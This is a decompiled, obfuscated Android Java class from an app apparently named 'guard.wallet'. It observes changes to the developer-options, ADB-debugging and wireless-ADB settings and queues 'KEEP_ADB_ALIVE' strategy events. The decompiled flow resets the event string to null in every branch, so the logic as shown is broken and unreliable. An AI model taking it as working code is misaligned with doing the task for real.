package p021y;

import a1.AbstractC0026q;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Objects;

/* renamed from: y.d */
/* loaded from: classes.dex */
public final class C0975d extends ContentObserver {
    public C0975d() {
        super(new Handler(Looper.getMainLooper()));
    }

    @Override // android.database.ContentObserver
    public final void onChange(boolean z2) {
        super.onChange(z2);
    }

    @Override // android.database.ContentObserver
    public final void onChange(boolean z2, Uri uri) {
        boolean equals;
        String str;
        boolean equals2;
        boolean equals3;
        super.onChange(z2, uri);
        if (uri != null) {
            Log.d("SettingsContentObserver", uri.toString() + " is changed");
            Uri uriFor = Settings.Global.getUriFor("development_settings_enabled");
            Uri uriFor2 = Settings.Global.getUriFor("adb_enabled");
            Uri uriFor3 = Settings.Global.getUriFor("adb_wifi_enabled");
            if (uri.equals(uriFor)) {
                Boolean valueOf = Boolean.valueOf(AbstractC0251g.m638K());
                synchronized (ADBConfig.class) {
                    equals3 = Objects.equals(Integer.valueOf(AbstractC0252h.m689J().getEnableDevelopment()), 1);
                }
                if (!Objects.equals(valueOf, Boolean.valueOf(equals3))) {
                    AbstractC0252h.m696Q();
                    str = AbstractC0251g.m638K() ? "KEEP_ADB_ALIVE_DEVELOPMENT_ON" : "KEEP_ADB_ALIVE_DEVELOPMENT_OFF";
                }
                str = null;
            } else if (uri.equals(uriFor2)) {
                Boolean valueOf2 = Boolean.valueOf(AbstractC0251g.m636I());
                synchronized (ADBConfig.class) {
                    equals2 = Objects.equals(Integer.valueOf(AbstractC0252h.m689J().getEnableDebug()), 1);
                }
                if (!Objects.equals(valueOf2, Boolean.valueOf(equals2))) {
                    AbstractC0252h.m696Q();
                    str = AbstractC0251g.m636I() ? "KEEP_ADB_ALIVE_ADB_DEBUG_ON" : "KEEP_ADB_ALIVE_ADB_DEBUG_OFF";
                }
                str = null;
            } else {
                if (uri.equals(uriFor3)) {
                    Boolean valueOf3 = Boolean.valueOf(AbstractC0251g.m637J());
                    synchronized (ADBConfig.class) {
                        equals = Objects.equals(Integer.valueOf(AbstractC0252h.m689J().getEnableWifiDebug()), 1);
                    }
                    if (!Objects.equals(valueOf3, Boolean.valueOf(equals))) {
                        AbstractC0252h.m696Q();
                        str = AbstractC0251g.m637J() ? "KEEP_ADB_ALIVE_WIFI_DEBUG_ON" : "KEEP_ADB_ALIVE_WIFI_DEBUG_OFF";
                    }
                } else {
                    Log.d("SettingsContentObserver", uri.toString() + " is changed");
                }
                str = null;
            }
            if (MainApplication.getInstance() == null || AbstractC0026q.m151B(str)) {
                return;
            }
            MainApplication.getInstance().offerStrategyEvent(str);
        }
    }
}
